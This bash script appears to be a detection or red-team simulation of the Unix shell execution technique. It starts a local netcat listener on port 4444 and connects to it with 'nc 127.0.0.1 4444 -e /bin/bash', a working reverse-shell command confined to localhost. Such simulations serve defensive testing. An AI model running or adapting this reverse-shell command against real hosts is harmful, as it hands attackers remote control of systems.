#!/bin/bash

# define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
RESET="\e[0m"

# intro
echo -e "\n${YELLOW}>>> [Execution] Command and Scripting Interpreter: Unix Shell Technique ${RESET}"
echo "Let's simulate the case when an attacker uses Reverse Shell to get remote control over the host"

echo "Attempting to bind bash stdin to the local TCP port 4444 ..."

# launch local listener
nc -lp 4444 > /dev/null 2>&1 &
listener_pid=$!
sleep 2

# execute bash after connection is established
if ! (nc 127.0.0.1 4444 -e /bin/bash > /dev/null 2>&1 &); then
    echo -e "${RED}Error! Attempt to establisg Reverse Shell was failed ${RESET}"
    else
        echo -e "${GREEN}Success! Reverse Shell connection was established ${RESET}"
fi

# Stop background listeners so the script can exit
kill $listener_pid 2>/dev/null || true
